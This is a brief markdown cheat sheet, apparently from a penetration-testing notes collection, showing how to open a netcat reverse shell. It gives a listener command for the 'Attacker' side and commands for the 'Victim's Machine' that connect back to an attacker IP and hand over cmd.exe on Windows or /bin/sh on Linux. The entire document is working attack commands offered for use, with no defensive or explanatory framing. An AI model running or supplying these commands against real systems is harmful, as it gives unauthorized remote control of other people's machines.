#### Create a reverse shell connection from a netcat client to a netcat netcat listener.

##### Attacker
```
nc -l -p 8888
```

##### Victim's Machine 
**Windows**
```
nc ip 8888 -e cmd.exe
```

**Linux**
```
nc ip 8888 -e /bin/sh
```

